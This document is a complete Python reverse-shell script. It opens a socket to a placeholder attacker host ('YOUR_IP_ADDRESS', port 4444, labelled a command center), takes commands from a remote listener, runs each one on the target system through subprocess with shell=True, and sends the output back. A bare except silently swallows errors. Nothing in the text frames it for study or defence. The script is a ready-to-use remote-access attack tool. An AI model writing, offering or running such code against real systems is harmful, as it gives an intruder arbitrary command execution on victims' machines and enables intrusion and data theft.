import socket
import subprocess
import os

# --- Configuration ---
RHOST = "YOUR_IP_ADDRESS" # Your Command Center IP
RPORT = 4444

def execute_payload():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((RHOST, RPORT))
        
        while True:
            # Receive command from your Listener
            data = s.recv(1024).decode('utf-8')
            if data.lower() == "exit":
                break
            
            # Execute the command on the target OS
            # 'shell=True' allows us to run any system command
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout_value = proc.stdout.read() + proc.stderr.read()
            
            # Send the result back to you
            s.send(stdout_value)
    except:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    execute_payload()